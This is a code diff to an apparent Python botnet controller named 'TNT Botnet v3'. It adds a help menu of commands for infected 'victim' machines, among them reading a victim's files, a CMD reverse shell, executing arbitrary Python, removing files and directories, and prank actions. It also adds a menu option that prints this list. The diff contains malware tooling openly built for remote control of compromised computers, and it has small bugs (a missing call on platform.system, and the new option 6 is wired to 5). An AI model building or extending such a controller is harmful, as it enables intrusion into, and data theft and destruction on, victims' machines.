@@ -87,7 +87,8 @@ if platform.system() == "Linux":
 \u001b[39m[\u001b[36m2\u001b[39m] Attack one bot
 \u001b[39m[\u001b[36m3\u001b[39m] Mass attack
 \u001b[39m[\u001b[36m4\u001b[39m] Attach a bot
-\u001b[39m[\u001b[36m5\u001b[39m] Update bot''',
+\u001b[39m[\u001b[36m5\u001b[39m] Update bot
+\u001b[39m[\u001b[36m6\u001b[39m] Avaliable commands''',
         "Greetings": "\u001b[31mBot Controller For TNT Botnet \u001b[31mv3\u001b[39m\n\n\n",
         "Answer_from_bot": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Bot sent answer:\u001b[39m\n",
         "require_option": "\u001b[39m[\u001b[33m?\u001b[39m]\u001b[93m This commandlet requires an option:\u001b[39m ",
@@ -95,6 +96,44 @@ if platform.system() == "Linux":
         "proc2": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Base found!",
         "no_bots_error": "\u001b[39m[\u001b[31m*\u001b[39m] No bots were attached yet!"
     }
+if platform.system() == "Windows":
+    help_message = '''
+Commands avaliable:
+[cat] = Read a victim's file
+[shell] = CMD Reverse shell
+[cdjoke] = Tryes to open CDRom
+[selftest] = Returns a version of TNT
+[ls] = Listen directory
+[talk] = Talks to victim via VBS
+[execpy] = Execute any python command
+[mkdir] = Adds directory
+[rmdir] = Removes directory
+[rm] = Removes file
+[file] = Creates file with any content
+[message] = pull a message out
+[fun] = Opens something
+[nice] = Starts fireshow
+[update] = doesn't work yet :(
+'''
+if platform.system == "Linux":
+    help_message = '''
+\u001b[31mCommands avaliable\u001b[39m:
+\u001b[34m[\u001b[32mcat\u001b[34m]\u001b[39m = Read a victim's file
+\u001b[34m[\u001b[31mshell\u001b[34m]\u001b[39m = CMD Reverse shell
+\u001b[34m[\u001b[31mcdjoke\u001b[34m]\u001b[39m = Tryes to open CDRom
+\u001b[34m[\u001b[32mselftest\u001b[34m]\u001b[39m = Returns a version of TNT
+\u001b[34m[\u001b[32mls\u001b[34m]\u001b[39m = Listen directory
+\u001b[34m[\u001b[31mtalk\u001b[34m]\u001b[39m = Talks to victim via VBS
+\u001b[34m[\u001b[31mexecpy\u001b[34m]\u001b[39m = Execute any python command
+\u001b[34m[\u001b[32mmkdir\u001b[34m]\u001b[39m = Adds directory
+\u001b[34m[\u001b[33mrmdir\u001b[34m]\u001b[39m = Removes directory
+\u001b[34m[\u001b[33mrm\u001b[34m]\u001b[39m = Removes file
+\u001b[34m[\u001b[33mfile\u001b[34m]\u001b[39m = Creates file with any content
+\u001b[34m[\u001b[31mmessage\u001b[34m]\u001b[39m = pull a message out
+\u001b[34m[\u001b[32mfun\u001b[34m]\u001b[39m = Opens something
+\u001b[34m[\u001b[33mnice\u001b[34m]\u001b[39m = Starts fireshow
+\u001b[34m[\u001b[32mupdate\u001b[34m]\u001b[39m = doesn't work yet :(
+'''
 #-------------------------------------------------------------------
 #MAIN CYCLE OF THE PROGRAM GOES THERE
 #-------------------------------------------------------------------
@@ -150,6 +189,8 @@ try:
             bot = input(cmds["require_option"])
             remote_update(bots_ipv4s_list[int(bot)], packet)
             print(cmds["success"])
+        elif int(com) == 5:
+            print(help_message)
         input("\n\n\nPress enter to continue")
         clear_screen()
 
